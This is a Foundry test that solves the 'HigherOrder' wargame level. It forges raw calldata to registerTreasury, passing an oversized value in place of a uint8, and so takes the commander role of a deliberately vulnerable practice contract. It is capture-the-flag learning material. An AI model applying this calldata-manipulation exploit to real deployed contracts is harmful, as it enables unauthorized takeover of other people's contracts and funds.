// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import "forge-std/Test.sol";

interface HigherOrderI {
    function registerTreasury(uint8) external;
    function claimLeadership() external;
    function commander() external returns(address);
}

contract HigherOrderTest is Test {
    HigherOrderI public ho;

    address public hacker = address(0x1337);

    function setUp() public {
        address deployedAddress = deployCode("30_HigherOrder.sol:HigherOrder");
        ho = HigherOrderI(deployedAddress);
        vm.deal(hacker, 1 ether);
    }

    function testExploit() public {
        vm.startPrank(hacker);

        console.log("Contract initial commander: ", ho.commander());

        bytes4 selector = bytes4(keccak256("registerTreasury(uint8)"));

        (bool success,) = address(ho).call(
            abi.encodePacked(
                selector,
                address(0xAAAA),
                uint8(0),
                uint256(9999999) 
            )
        );
        require(success, "la llamada fallo");
        ho.claimLeadership();
        console.log("Contract commander after donate: ", ho.commander());
        
        assertEq(ho.commander(), hacker);
        vm.stopPrank();
    }
}
